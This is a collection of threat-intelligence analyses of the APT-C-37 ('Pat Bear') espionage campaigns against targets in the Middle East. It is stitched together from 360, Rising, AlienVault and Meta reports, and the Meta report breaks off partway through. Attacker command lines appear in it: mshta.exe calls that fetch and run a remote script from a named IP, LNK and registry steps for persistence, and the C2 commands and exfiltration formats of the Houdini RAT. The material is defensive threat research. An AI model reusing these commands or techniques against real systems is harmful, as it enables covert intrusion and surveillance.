为更好的躲避被察觉到，除了对文件图标进行伪装外，还会把RAT插入到正常的APP中，如一款名为“زوجات الرسول”的APP，它运行后展示的是正常时的界面，但当接收到指定的广播时，便在后台进行间谍活动。
图3.1 带有两种RAT的伪装APP“زوجات الرسول”
文件图标伪装
图3.2 伪装的应用软件图标
四、 RAT攻击样本分析
截至目前，拍拍熊组织此次攻击活动已使用到数种分别针对Android和Windows的不同RAT。
Android
Android端共使用到三种RAT，其中有两种（DroidJack和SpyNote）是使用较频繁的商业RAT，曾在多个黑客论坛上进行传播，已被多家安全公司查杀和曝光。而另外一种我们认为是专门为此次攻击开发的，我们命为SSLove，其仅出现在该活动中，并历经数个版本的更新。
DroidJack
Droidjack是一个极度流行的RAT，有自己的官网，功能强大，且有便捷的管理工具。该组织在使用Droidjack时除了直接使用外；还会把其插入到正常APP中进行隐藏，有趣的是同时SSLove也会一块插入到该APP中，这意味着该APP会同时带有两种RAT。
图4.1 Droidjack管理工具界面图
SpyNote
SpyNote类似Droidjack ，虽然拍拍熊组织使用到SpyNote，但该RAT在此次攻击活动中被用到的次数有限。
图4.2 SpyNote管理工具界面图
SSLove
这是一个之前未被曝光的RAT。根据该RAT包含的特殊字符“runmylove”，结合其是首款被发现到的使用SqlServer实现指令交互的RAT，我们命名为SSLove。最新版本的SSLove具有窃取短信、通讯录、WhatsApp和Telegram数据、使用FTP进行上传文件等多种功能。
该组织在使用SSLove时和Droidjack用法一样，一种是直接使用，其中上述提到的Al Swarm网站被拍拍熊组织用来水坑攻击时使用的伪装APP就属于这种；另一种是插入到正常APP中进行隐藏。
图4.3 SSLove指令功能相关数据表
Windows
Windows端共使用到三种RAT，都是在中东地区流行了数年的RAT，其中有两种（njRAT和H-worm）曾被多次曝光，但依旧活跃。
njRAT
njRAT[2]又称Bladabindi，通过控制端可以操作受控端的注册表，进程，文件等，还可以对被控端的键盘进行记录。同时njRAT采用了插件机制，可以通过不同的插件来扩展njRAT的功能。
该组织在使用njRAT时大多不是直接使用，而是在njRAT的基础上进行了二次封装，使用C#为njRAT加了一层壳，并对壳的代码进行了大量的混淆。该壳的作用是在内存中加载njRAT运行，防止njRAT被杀毒软件检测，而上述提到的Amaq网站被该组织用来水坑攻击时使用的伪装成Adobe Flash Player就属于这种。
图4.4 从Amaq水坑活动中伪装的恶意样本提取出来的njRAT
H-Worm
H-Worm是一个基于VBS（Visual Basic Script）的RAT，该RAT情况信息可参阅FireEye之前发表的详细报告《Now You See Me - H-worm by Houdini》[3]。此次攻击使用的是混淆变异后的H-Worm版本，去除混淆后进行分析，我们发现其指令列表并无变化。
图4.5 混淆的H-Worm代码片段
表3 H-Worm样本指令与功能对应关系
Fkn0wned
fkn0wned是一款通过VB.NET编写的RAT，此次攻击使用的属于一个早期版本，仅接收“DOWNLOAD”指令，DDoS功能代码并未起作用，该RAT实际是个下载者。
图4.4 fkn0wned配置信息及指令响应代码图
C&C、IP及部分样本对应关系
图4.5 C&C、IP及部分样本对应关系
五、 受攻击地区分布情况
截至目前，360烽火实验室发现此次拍拍熊组织攻击活动影响到的国家共有11个 ，通过查询可以知悉这些国家均存在某武装组织组织人员。显而易见，造成这个分布现象的缘由正是该组织采用的数次针对性的水坑攻击导致。
图5.1 受攻击的地区分布情况
六、 溯源与关联
360烽火实验室通过对此次拍拍熊攻击活动的分析，结合之前对黄金鼠组织的分析，我们发现两个组织除掉攻击目标和各自的专属RAT外，两者在下面几个方面有很强的关联性。
均熟悉阿拉伯语，持续数年针对Android和Windows平台，擅长水坑攻击。
均使用多种RAT，其中大多数双方都有使用。
两个组织在两个时间段内使用了处于同一网段的C&C。
七、 总结
随着地缘政治冲突等问题，各方试图通过网络情报和网络攻击活动占领先机，进一步造成网络空间冲突的加剧。此次拍拍熊组织又是一个基于此而产生的间谍情报活动组织，没有和平的因素，攻击不可能会停止。近期报道称中东某国境内的某武装组织最后据点被攻下且被宣灭亡，这或许意味着拍拍熊组织的攻击活动将会有所变化，最后愿早日长久和平!
附录A：样本MD5
Android攻击样本MD5
Windows攻击样本MD5
btcaes2.duckdns.org
附录C：参考链接
[1] https://ti.360.net/blog/articles/analysis-of-apt-c-27/
[2] https://en.wikipedia.org/wiki/Njrat
[3] https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html
本文链接： https://blogs.360.cn/post/analysis-of-apt-c-37.html
-- EOF --
360烽火实验室（360 Beaconlab）
2019-03-25 14:38:12
，添加在分类一、背景介绍
近日，瑞星威胁情报中心捕获到两起针对巴勒斯坦大选的APT攻击事件，通过对攻击手法的分析来看，发现这两起攻击均与APT组织“APT-C-37”（又称“拍拍熊”）有关。该组织通过投放伪装成巴勒斯坦选举会议的相关文档等方式进行远程控制攻击，其意图以攻击巴勒斯坦政府为主，目的在于影响巴勒斯坦国家大选。
据悉，“拍拍熊”是一个中东地区背景，使用阿拉伯语且有政治动机的APT攻击组织，自2015年被发现至今，频繁进行有组织、有计划、针对性的不间断攻击，特别是针对巴勒斯坦、以色列、埃及等中东动乱国家进行攻击。“拍拍熊”组织一直保持着积极的活跃度，典型的攻击目标包括政府机构、武装组织领导、媒体人士、政治活动家和外交官等。
瑞星安全专家介绍，此次截获的APT攻击事件应与近期的巴勒斯坦大选有关，通过截获的两起诱饵文件发现，其主题为选举委员会会议和Majdalani严重怀疑阿巴斯总统关于总统选举。攻击者将带有木马病毒的诱饵文档通过邮件等方式进行投放，而该病毒可自解压，一旦受害者运行了自解压的木马文件，就会被攻击者远程控制，从而可进行各种不法操作。
由于“拍拍熊”组织针对的目标都是具有重大信息资产，如国家军事、情报、战略部门，以及如金融、能源等影响国计民生的行业，因此国内相关政府机构和企业单位务必要引起重视，加强防御措施。
二、攻击事件
这两起攻击事件均是针对巴勒斯坦，攻击者投放的诱饵文档都和巴勒斯坦大选有关。第一个诱饵文档的主题是：选举委员会会议。第二个诱饵文档的主题是：Majdalani严重怀疑阿巴斯总统关于总统选举。
图：诱饵文档1
图：诱饵文档2
三、技术分析
3.1 攻击流程
图：攻击流程
3.2 自解压文件
攻击者投放的病毒样本为SFX（自解压）文件，并且图标被伪装成WORD图标。在自解压文件中有一个和巴勒斯坦大选相关的诱饵文档和一段自解压命令。
文件名 اجتماع لجنة الانتخابات – إقليم الشمال .exe
中文翻译 选举委员会会议-北领地.exe
MD5 6E62856152EB198B457487E1EED94D76
文件大小 396.71KB（406234 bytes）
文件格式 Win32 EXE
创建时间 2019-4-27
VT首次上传时间 2019-11-05
VT检测结果 37 / 70
涉及URL http://192.119.111.4/xx/dv
内含诱饵文档名 GSHword.docx
表：自解压文件1信息
图：自解压文件1
文件名 المجدلاني يشكك بجدية الرئيس عباس بشأن الانتخابات الرئاسية.exe
中文翻译 Majdalani严重怀疑阿巴斯总统关于总统选举.exe
MD5 4FA306739FD3ECC75B0EE202A614061D
文件大小 389.28KB （398627bytes）
文件格式 Win32 EXE
创建时间 2019-4-27
VT首次上传时间 2019-11-07
VT检测结果 27 / 70
涉及URL http://192.119.111.4/xx/dv
内含诱饵文档名 wordwatan.docx
表：自解压文件2信息
图：自解压文件2
自解压命令：
通过分析自解压命令，可以得知当受害者运行自解压文件后，病毒样本会执行如下操作：
图：自解压命令
①攻击者为了达到迷惑受害者的目的，会先将诱饵文档释放在%temp%路径下，并打开。
文件名 GSHword.docx
MD5 D99F2923C81E703C6345D30BF0E15CD9
所处目录 %temp%
VT检测结果 0 / 59
表：诱饵文档1：GSHword.docx的信息
文件名 wordwatan.docx
MD5 7E55C6E273FE45336299A7AAA46D5A2B
所处目录 %temp%
VT检测结果 0 / 62
表：诱饵文档2：wordwatan.docx的信息
②利用mshta.exe执行http://192.119.111.4/xx/dv脚本。
③为了使得攻击保持持久性，攻击者在启动菜单中下创建一个LNK文件。此LNK文件被伪装成HelPPane.lnk（windows自带帮助程序），但是它的目标属性指向：C:\Windows\System32\mshta.exe http://192.119.111.4/xx/dv。
文件名 HelPPane.lnk
MD5 F4355A61D7AC60D3282A9A207A643589
目标属性 C:\Windows\System32\mshta.exe http://192.119.111.4/xx/dv
所处目录 %appdata% \Microsoft\Windows\Start Menu\Programs\Startup
VT检测结果 样本无上报
表：HelPPane.lnk 信息
图：HelPPane.lnk的目标属性
3.3 dv.vbs
来源 http://192.119.111.4/xx/dv
MD5 7BCBE8CC5A05DF9FCEA4E7E52BD00D79
执行方式 C:\Windows\System32\mshta.exe http://192.119.111.4/xx/dv
涉及URL http://192.119.111.4/xx/dv.zip
表：dv.vbs 信息
如下是dv.vbs执行的恶意操作：
①在%temp%目录中创建xxxx.tmp（xxxx表示随机命名）。
②从http://192.119.111.4/xx/dv.zip中获取vbs脚本并存于xxxx.tmp中。
③将xxxx.tmp文件的后缀名改为vbs，利用powershell.exe执行xxxx.vbs。
④最后将xxxx.vbs文件删除。
图：dv.vbs脚本文件
3.4 dv.zip.vbs
文件名 xxxx.tmp（xxxx表示随机命名）
MD5 9094DF33AA0D6B1DD4EFAF34E91A05C4
所处目录 %temp%
来源 http://192.119.111.4/xx/dv.zip
涉及URL http://192.119.111.4/xx/f_Skoifa.vbs
表：dv.zip.vbs 信息
如下是dv.zip.vbs执行的恶意操作：
3.4.1 下载f_Skoifa.vbs脚本
下载http://192.119.111.4/xx/f_Skoifa.vbs脚本文件，存于%USERPROFILE%\AppData\Local中。
文件名 f_Skoifa.vbs
MD5 FD5BA76F85C9746F7A326B954874F5A6
所处目录 %USERPROFILE%\AppData\Local
来源 http://192.119.111.4/xx/f_Skoifa.vbs
表：f_Skoifa.vbs 信息
图：下载f_Skoifa.vbs
3.4.2 创建Help文件夹
判断%USERPROFILE%\AppData\Roaming\Microsoft\Windows\ 中是否存在Help文件夹，没有则创建。
文件名 Help
所处目录 %USERPROFILE%\AppData\Roaming\Microsoft\Windows
子文件 HelpPane.lnk
表：Help 信息
图：创建Help文件夹
3.4.3 转移启动菜单为Help文件夹
（1）在注册表HKEY_CURRENT_USER中创建 SOFTWARE\Microsoft\Windows\CurrentVersion\Help。
（2）更改Windows启动目录为Help文件夹：
①在注册表HKEY_CURRENT_USER中修改 SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders中的Startup值为%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Help 。
②在注册表HKEY_CURRENT_USER中修改 SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders中的Startup值为%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Help。
图：更改注册表
3.4.4 创建指向f_Skoifa.vbs 的HelpPane.lnk
在%USERPROFILE%\AppData\Roaming\Microsoft\Windows\help文件夹中创建一个LNK文件。此LNK文件被伪装成HelpPane.lnk（windows自带帮助程序），它的属性目标指向C:\Windows\system32\wscript.exe %USERPROFILE%\AppData\Local\f_Skoifa.vbs。
文件名 HelpPane.lnk
MD5 2818ECDE79CEDC1E181D7B69F14840A6
目标属性 C:\Windows\System32\wscript.exe %USERPROFILE%\AppData\Local\f_Skoifa.vbs
所处目录 %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Help
VT检测结果 样本无上报
表：HelpPane.lnk 信息
图：创建快捷方式文件
3.4.5 更改f_Skoifa.vbs和HelpPane.lnk的文件属性
攻击者为了保持持久性，将
%USERPROFILE%\AppData\Local\f_Skoifa.vbs和%USERPROFILE%\AppData\Roaming\Microsoft\Windows\help\HelpPane.lnk的文件属性更改为系统属性和隐藏属性。
图：更改文件属性
3.5 f_Skoifa.vbs
f_Skoifa.vbs是个被加密的远控木马，解密后对其进行技术分析发现其就是远控木马Houdini。
文件名 f_Skoifa.vbs
MD5 FD5BA76F85C9746F7A326B954874F5A6
所处目录 %USERPROFILE%\AppData\Local
来源 http://192.119.111.4/xx/f_Skoifa.vbs
涉及URL http://192.119.111.4:4587/is-ready
http:// 192.119.111.4:4587 / is-enum-driver
http:// 192.119.111.4:4587 / is-sending
http:// 192.119.111.4:4587 / is-enum-faf
http:// 192.119.111.4:4587 / is-enum-process
表：_Skoifa.vbs 信息
图：f_Skoifa.vbs密文
图：f_Skoifa.vbs明文
如下是f_Skoifa.vbs的详细分析：
3.5.1远控指令分析
样本首先和C2地址http://192.119.111.4:4587/is-ready建立连接，然后使用WMI的WQL语句来获取受害者机器上的有效信息，将信息发送到C2地址上。接着等待攻击者响应，将远控指令发送到受害者机器上以便进行下一步恶意操作。
发送信息的记录结构为：
逻辑磁盘卷序列号<|>电脑名<|>用户名<|>操作系统版本<|>plus<|>防病毒产品名（如果没有防病毒产品，则记录为nan-av）。例如："7FC8F3B9<|>123-PC<|>Administrator<|>Microsoft Windows 7 旗舰版 <|>plus<|>nan-av<|>"。
图：发送信息和接收远控指令
3.5.2 八个远控指令名分析
攻击者发送过来的远控木马的攻击指令总计8个，每个远控指令的结构为：
远控指令名<|>指令参数1（<|>指令参数2）。样本从远控指令中解析出远控指令名，然后根据远控指令名对受害者机器发动相应地攻击。
下面分别对这8个远控指令名进行详细分析。
图：远控指令
①远控指令名：excecute
调用VBScript中的execute函数，直接执行指令参数1。指令参数1可以是一段pwoershell或其他。
图：远控指令名excecute
②远控指令名：send
远控指令名send的作用是下载文件以执行。
远控指令名send对应的远控指令结构为：
send<|>fileurl<|>filedir。包含两个指令参数，指令参数1表示C2地址的文件路径，指令参数2表示受害者机器上的文件目录。
数据传输方式为POST，从http:// 192.119.111.4:4587 / is-sending<|> fileurl（指令参数1）中获取文件，文件命名为fileurl（指令参数1）斜线（\）后的字符。文件存储于filedir（指令参数2）中。
下载前判断受害者机器上是否存在被下载的文件，如果存在则将其删除，然后重新下载，下载完后利用wscript.shell将文件执行起来。
图：远控指令名send
图：远控指令名send对应的操作函数
③远控指令名：recv
此次攻击中，远控指令名recv的对应的操作函数upload并不存在。但是从之前的攻击案例中可以得知，这个远控指令的作用是更新载荷。
图：远控指令名recv
④远控指令名：enum-driver
远控指令名enum-driver的作用是向C2地址（http:// 192.119.111.4:4587 / is-enum-driver）发送由受害者机器上的磁盘信息组成的列表。
发送列表的记录结构为：
磁盘1路径|磁盘1类型<|>（磁盘2路径|磁盘2类型<|>……磁盘n路径|磁盘n类型<|>）。
图：远控指令名enum-driver
图：远控指令名enum-driver对应的操作函数
⑤远控指令名：enum-faf
远控指令名enum-faf的作用是向C2地址（http:// 192.119.111.4:4587 / is-enum-faf）发送由指定文件（指令参数1）下的文件夹信息和文件信息组成的列表。
发送列表的记录结构为：
指定文件 <|>子文件夹1的名称｜｜d｜子文件夹1的属性<|>……<|>子文件夹n的名称｜｜d｜子文件夹n的属性<|>子文件1的名称｜子文件1的大小｜f｜子文件1的属性<|>……子文件n的名称｜子文件n的大小｜f｜子文件n的属性<|>。
图：远控指令名enum-faf
图：远控命令enum-faf对应的操作函数
⑥远控指令名：enum-process
远控指令名enum-process对应的作用是向C2地址（http:// 192.119.111.4:4587 / is-enum-process）发送由受害者机器上的进程名，进程ID和进程对应的可执行文件路径组成的列表。
发送列表的记录结构为：
进程1的名称｜进程1的ID｜进程1对应的可执行文件地址<|>……进程n的名称｜进程n的ID｜进程n对应的可执行文件地址<|>。
图：远控指令名enum-process
图：远控指令名enum-process对应的函数操作
⑦远控指令名：delete
此次攻击中，远控指令名delete对应的操作函数deletefaf并不存在。但是通过分析之前的案例可以得知这个指令的作用是删除文件。
图：远控指令名delete
⑧远控指令名：exit-process
远控指令名exit-process的作用是通过进程ID（指令参数1）终止指定进程。
图：远控指令名exit-process
图：远控指令名exit-process对应的操作函数
此次最新的攻击案例中涉及到的攻击手法和今年其他相关安全厂商披露的攻击事件中所用到的技术有很大的重合性。攻击者熟练使用阿拉伯语，针对目标为巴勒斯坦，攻击手法采用SFX（自解压文件）和mshta.exe去远程执行脚本文件，最终投递Houdini远控木马。
APT攻击有着针对性强、组织严密、持续时间长、高隐蔽性和间接攻击的显著特征，针对的目标都是具有重大信息资产，如国家军事、情报、战略部门和影响国计民生的行业如金融、能源等，国内相关政府机构和企业单位务必要引起重视，加强防御措施。
五、预防措施
1.不打开可疑邮件，不下载可疑附件。
此类攻击最开始的入口通常都是钓鱼邮件，钓鱼邮件非常具有迷惑性，因此需要用户提高警惕，企业更是要加强员工网络安全意识的培训。
2.部署网络安全态势感知、预警系统等网关安全产品。
网关安全产品可利用威胁情报追溯威胁行为轨迹，帮助用户进行威胁行为分析、定位威胁源和目的，追溯攻击的手段和路径，从源头解决网络威胁，最大范围内发现被攻击的节点，帮助企业更快响应和处理。
3.安装有效的杀毒软件，拦截查杀恶意文档和木马病毒。
杀毒软件可拦截恶意文档和木马病毒，如果用户不小心下载了恶意文档，杀毒软件可拦截查杀，阻止病毒运行，保护用户的终端安全。
4.及时修补系统补丁和重要软件的补丁。
六、IOC信息
URL http://192.119.111.4/xx/dv
http://192.119.111.4/xx/dv.zip
http://192.119.111.4/xx/f_Skoifa.vbs
http://192.119.111.4:4587/is-ready
http://192.119.111.4:4587 / is-enum-driver
http://192.119.111.4:4587 / is-sending
http://192.119.111.4:4587 / is-enum-faf
http://192.119.111.4:4587 / is-enum-process
MD5 6E62856152EB198B457487E1EED94D76
7BCBE8CC5A05DF9FCEA4E7E52BD00D79
9094DF33AA0D6B1DD4EFAF34E91A05C4
FD5BA76F85C9746F7A326B954874F5A6
4FA306739FD3ECC75B0EE202A614061D
2818ECDE79CEDC1E181D7B69F14840A6
F4355A61D7AC60D3282A9A207A643589In 2019, several industry analyst reports confused the threat groups Molerats and APT-C-37 due to their similarity, and this has led to some confusion and inaccuracy of attribution.
For example, both groups target the Middle East and North Africa region (with a special emphasis on Palestine territories). And, they both approach victims through the use of phishing emails that contain decoy documents (mostly in Arabic) and contain themes concerning the political situation in the area.
To improve understanding of the differences and similarities of the two groups (as well as the links between them), we at Alien Labs™ are providing an analysis of their 2019 activity.
A recent spear-phishing document from Molerats
APT-C-37 Overview
APT-C-37 , also known as Pat-Bear or the Syrian Electronic Army (SEA), was first seen in October 2015 targeting members of a terrorist organization. Since 2015, however, APT-C-37 has broadened their objectives to include government agencies, armed forces leadership, media organizations, political activists, and diplomats. The group mostly targets victims in Western countries, with the intent of defacing their websites and social accounts while leaving a public footprint after hacking one of their victims.
In previous attacks, APT-C-37 targeted Windows and Android systems, utilizing popular commercial remote access trojans (RATs) such as DroidJack, SpyNote, njRAT, SSLove, and H-Worm.
Technical Analysis: APT-C-37 2019
June 2019 : APT-C-37 released an Android app named after the instant messaging software “WhatsApp” as an espionage tool to reportedly spy on the Syrian opposition forces. The app was capable of installing the SSLove RAT to pull private information from the phone and exfiltrating it to a remote location.
Molerats Overview
Molerats has been present in the cybercriminal landscape since 2012 . In an analysis released by the Kaspersky’s GReAT (Global Research & Analysis Team) earlier this year on the Gaza Hacker Team and their various subgroups, Kaspersky concluded that Molerats is Gaza Cybergang “Group1.” The report also concluded that Molerats (i.e. Cybergang Group 1) operates with a lower level of sophistication than other groups within the Gaza Hacker Team. In addition, a 2016 article in Security Week reported that one of Molerats campaigns (October 2016) heavily used popular RATs like NjRat and H-Worm (aka Houdini).
Technical Analysis: Molerats 2019
October 2019 : In Molerats’ October operation, the attack was distributed as a phishing campaign in the Middle East. Emails included a Microsoft Word file attachment with the title “Daily report on the most important Palestinian developments for the day 9-9-2019.doc” — content that spoke to the political situation in Palestine. When a victim opened the attachment, the malware performed the following:
Displayed the Microsoft Word document as distraction.
Unpacked a Microsoft.vbs into the folder ‘C:\programdata\Micorsoft’ to confuse the victim with a typo inside the folder ‘Micorsoft’.
Programmed itself as a scheduled task, once the previous vbs was executed.
Made an HTTPS request to download GoogleChrome.vbs, which had an additional HTTPS request to GoogleChrome.msi. (This file, an additional MSI file and potentially the RAT to infect the system, was not available at the time of the investigation.)
Diagram of Molerats October 2019 campaign
September-October 2019 : In Molerat’s September campaign, the malware propagated through an executable with a fake PDF file. With the names “The case of Muath Ismail Haniyeh.pdf.exe” and “Interface.pdf.exe,” the executables are both signed under the name “FoxitReader.”
When a victim opened the attachment, the malware performed the following:
Both documents extracted an executable and then a PDF to distract the user.
The executable with names FoxitReader.exe or NEG.exe contained a copy of the Perseus Trojan (despite both being signed by FoxitReader), which communicated with the command and control (C&C) infrastructure through HTTPS.
Diagram of Molerats September – October 2019 campaign
August 2019 : In August, Molerats ran another campaign, however we did not detect the use of phishing. Instead, Alien Labs identified a sample communicating with a new domain that used the same C&C pattern detected by an IDS signature. You can find details and more on the Open Threat Exchange (OTX) . The domain, which has been up since 2017, has two malicious files associated with it:
The first file matched the same IDS signature. See additional info at OTX .
The second file was first uploaded to VirusTotal back in 2018, but Alien Labs recently rescanned the file and found the latest domain (www.freshchrysanthemum[.]com). At the time of the analysis, the C&C was down or filtering the connection. Some of the other public sandboxes such Hybrid Analysis and JoeSandbox exhibit the same behavior. An analysis of the sample by Any.run was able to resolve the domain and reach to it with an IP in Norway (82.102.22.109). See additional info at OTX .
January 2019 : In January, Molerats switched its tactics back to phishing with Word Documents that concealed a malicious Vbscript. The vbs contained an encoded version of the malware, which was scheduled and executed after decryption. The malicious file corresponded to a version of the Fraudrop Trojan, packed with Enigma as previously seen in other Molerats’ samples, and it used the Simple and Fast Multimedia Library (SMFL), which is commonly used for game development.
Diagram of Molerats January 2019 campaign
November 2019 : In November, Alien Labs discovered a new Molerats sample. In this case, the group recycled the domain used in their January attack for C&C. In this campaign, an executable with an Arabic name that translates to “Winter government by names,” extracted and executed a modified version of the Fraudrop trojan. Molerats had attempted to hide the packer they were using and they modified the filename, however the C&C and Beacon they used were the same and they were using the SMF library for development.
Diagram of Molerats November 2019 campaign
APT-C-37 vs. Molerats
Windows and Android attacks.
Tends to leave public signatures for everyone to show they hacked their victims or leak exfiltrated data.
Phishing campaigns with MS Word documents or PDF files with the malware packed inside the document or retrieved through HTTPS.
Persistence is obtained through scheduled tasks.
Malware is not a constant and malware is heavily rotated, but C&C are sometimes recycled.
Is this a Molerats or APT-C-37 attack?
The three attacks below have been attributed to APT-C-37 and Molerats , however it’s our opinion at Alien Labs that they don’t share the clear patterns of Molerats or APT-C-37 we’ve seen prior to this blog.
November 2019 (Palestinian election): Attributed on Twitter by Rising Enterprise Security to APT-C-37
This campaign tried to utilize the Palestinian elections as a theme for their phishing emails, and the target appeared to be the Palestinian government. We observed the use of phishing emails in the campaign with fake documents themed after the elections that contained at least two different malicious files. The file names are (translated here):
Election Committee Meeting - Northern Territory.exe
Majdalani seriously doubts President Abbas about the presidential election.exe
Both files used a Microsoft Word icon in attempt to make the victims run the malicious executable. When executed it performed the following.
Extracted and opened a relevant Word document into the temp folder to lure the target.
Extracted a LNK file (a file extension for a shortcut file used by Microsoft Windows to point to an executable file ) and used it to achieve persistence in the system. The LNK file was camouflaged under the name “HelpPane.lnk,” so it could execute the next step of future campaigns.
Downloaded a script that included mshta.exe (a utility that executes Microsoft HTML Applications), which then downloaded an additional script that included a PowerShell.
Finally, downloaded and executed a RAT, in particular the popular Houdini RAT (also known as H-worm).
Diagram of November 2019 attributed on Twitter to APT-C-37
August 2019 : Attributed on Twitter to APT-C-37
This attack, attributed to APT-C-37 on Twitter, is very similar to the November 2019 attack described above, however it did not use the Palestinian elections to lure victims. This time, the threat group used another .exe which included a decoy Word document titled “A new scandal for a Hamas leade r” . The execution was very similar to the November 2019 campaign, however this time the camouflaged LNK file was “History.lnk” and it installed a version of Houdini RAT.
Diagram of August 2019 campaign attributed on Twitter to APT-C-37
April 2019 : Attributed on Twitter to APT-C-37
In April 2019, security researchers on Twitter observed another phishing email with an attached executable. When executed, the malware opened a document talking about the Palestinian Ministers to keep the victim entertained while it installed a LNK file “MsOfficee.lnk,” which is very close to the real “MsOffice.lnk.” The file allowed the Houdini RAT to execute and gain persistence on the targeted machine.
Diagram of April 2019 campaign attributed on Twitter to APT-C-37
The three attacks above have the following similar characteristics:
They used phishing documents themed on Palestine.
.exe files opened relevant documents in Arabic.
The first step executed mshta.exe.
They obtained persistence in the victim’s systems through LNK files with decoy names.
They used Timeout.exe to pause execution for different times before executing the RAT.
C&C communication went through HTTP.
They executed the Houdini RAT.
The above-mentioned target and the delivery methods suggest these attacks are being launched by Molerats (note: the Houdini RAT is very popular in the Middle East and cannot be used for attribution). However, in the opinion of Alien Labs, the other attack patterns make it hard for us to tie these attacks to Molerats or APT-C-37, as they do not have a clear pattern that aligns to the samples previously associated with Molerats or APT-C-37. In light of this, Alien Labs currently buckets these three attacks under an unattributed classification.Three separate hacking groups from Syria targeted a wide range of people in Syria, including civil society, journalists, humanitarian organizations and the anti-regime military forces. Each of these three hacking groups had links to the Syrian government, including Syria’s Air Force Intelligence.
Today, we are sharing actions we’ve taken against four distinct groups of hackers in Pakistan and Syria over the past several months. To disrupt these malicious groups, we disabled their accounts, blocked their domains from being posted on our platform, shared information with our industry peers, security researchers and law enforcement, and alerted the people who we believe were targeted by these hackers.
The group from Pakistan — known in the security industry as SideCopy — targeted people who were connected to the previous Afghan government, military, and law enforcement in Kabul. In Syria, we removed three distinct hacker groups with links to the Syrian government. The first network in Syria — known as the Syrian Electronic Army — targeted human rights activists, journalists and other groups opposing the ruling regime. We linked this activity to Syria’s Air Force Intelligence. The second network from Syria — known in the security community as APT-C-37 — targeted people linked to the Free Syrian Army and former military personnel who had since joined the opposition forces. Our investigation linked this activity by APT-C-37 to what we believe is a separate unit in Syria’s Air Force Intelligence. Finally, the third network from Syria targeted minority groups, activists, opposition, Kurdish journalists, activists, members of the People’s Protection Units (YPG), and Syria Civil Defense or White Helmets, a volunteer-based humanitarian organization. Our investigation found links between this activity and individuals associated with the Syrian government.
Meta’s threat intelligence analysts and security experts work to find and stop a wide range of threats including cyber espionage campaigns , influence operations and hacking of our platform by nation-state actors and other groups. As part of these efforts, our teams routinely disrupt adversary operations by disabling them, notifying users if they should take steps to protect their accounts, sharing our findings publicly and continuing to improve the security of our products.
Here are the details on each disruption:
1. Pakistan
In August, we removed a group of hackers from Pakistan, known in the security industry as SideCopy , that targeted people in Afghanistan, particularly those with links to the Afghan government, military and law enforcement in Kabul. Given the ongoing crisis and the government collapse at the time, we moved quickly to complete the investigation and take action to protect people on our platform, share our findings with industry peers, law enforcement and researchers, and alert those who we believe were targeted. In addition, we rolled out a number of security measures for people in Afghanistan to protect their Facebook accounts.
This malicious activity had the hallmarks of a well-resourced and persistent operation while obfuscating who’s behind it. On our platform, this cyber espionage campaign ramped up between April and August of 2021 and manifested primarily in sharing links to malicious websites hosting malware.
We identified the following tactics, techniques and procedures (TTPs) used by this threat actor across the internet, including on our apps (threat indicators can be found at the end of the report):
This group created fictitious personas — typically young women — as romantic lures to build trust with potential targets and trick them into clicking on phishing links or downloading malicious chat applications.
They operated fake app stores and also compromised legitimate websites to host malicious phishing pages to manipulate people into giving up their Facebook credentials.
SideCopy attempted to trick people into installing trojanized chat apps (i.e. they contained malware that misled people about its true intent), including messengers posing as Viber and Signal, or custom-made Android apps that contained malware to compromise devices. Among them were apps named HappyChat, HangOn, ChatOut, TrendBanter, SmartSnap, and TeleChat — some of which were in fact functioning chat applications.
These apps typically included two malware families: PJobRAT and a previously unreported Android malware strain we are calling Mayhem. These two families have the ability to retrieve people’s contact list, text messages, call logs, location information, media files on the device or connected external storage, and general device metadata. They can also scrape content on the device’s screen via accessibility services.
In August, 2021, the group shifted to using bit[.]ly URL shortener links to mask the final destination they were redirecting their targets to after they clicked on the malicious link.
2. Syria
In October, we took down a hacking group, known in the security community as the Syrian Electronic Army (SEA) or APT-C-27, that targeted people in Syria, including humanitarian organizations, journalists and activists in Southern Syria, critics of the government, and individuals associated with the anti-regime Free Syrian Army. Our investigation found that this threat actor has been subsumed into the Syrian government forces in recent years, with this latest activity linked to Syria’s Air Force Intelligence. On our platform, this campaign manifested primarily in targeting people with social engineering tactics to trick them into clicking on links or downloading malicious software.
We identified the following TTPs used by this threat actor across the internet, including on our apps (threat indicators can be found at the end of the report):
This group shared phishing links to lead people to either websites hosting credential phishing pages or malware. The phishing campaigns were designed to manipulate their targets into giving away their credentials to Facebook accounts.
They used a combination of commercially available (e.g., HWorm/njRAT for Windows) and custom-built malware families (e.g., HmzaRat Desktop for Windows and SilverHawk aka HmzaRAT for Android). For example, they deployed Android malware as part of trojanized applications, including those named the United Nations, VPN Secure and several popular chat apps like Telegram — all hosted on attacker-controlled websites.
This group also used new Android malware built with the open-source mobile app development tool Xamarin and, as of now, it’s only being detected by one anti-virus engine in public virus repositories. We found this malware in trojanized versions of Telegram and a Syrian news app, that are being distributed exclusively through phishing websites hosted on the Vercel cloud platform.
The malware families SEA relied on are capable of collecting a range of sensitive user information, once the device is compromised, including the ability to record audio and video, edit or retrieve files, call logs, address book, and text messages.
3. Syria
In October, we took down a hacking group, known in the security community as APT-C-37, that targeted people linked to the Free Syrian Army and former military personnel who had since joined the opposition forces. Our investigation linked this activity by APT-C-37 to what we believe is a separate unit in Syria’s Air Force Intelligence. This operation on our platform involved social engineering tactics to trick people into clicking on links to malicious websites hosting malware or credential phishing campaigns aimed at obtaining access to people’s Facebook accounts.
We identified the following TTPs used by this threat actor across the internet, including on our apps (threat indicators can be found at the end of the report):
APT-C-37 has continued to use commodity malware known as SandroRAT in addition to an Android malware family known as SSLove, likely developed in-house.
This group relied on social engineering to distribute malware to manipulate their targets into visiting attacker-controlled websites. Some of these sites focused on content about Islam, others masqueraded as legitimate app stores or used look-alike domains posing as popular services, including Telegram, Facebook, YouTube, and WhatsApp.
APT-C-37 relied on Android malware with common malicious functionality to retrieve sensitive user data, including call logs, contact information, device information, user accounts, take photos, and retrieve attacker specified files.
4. Syria
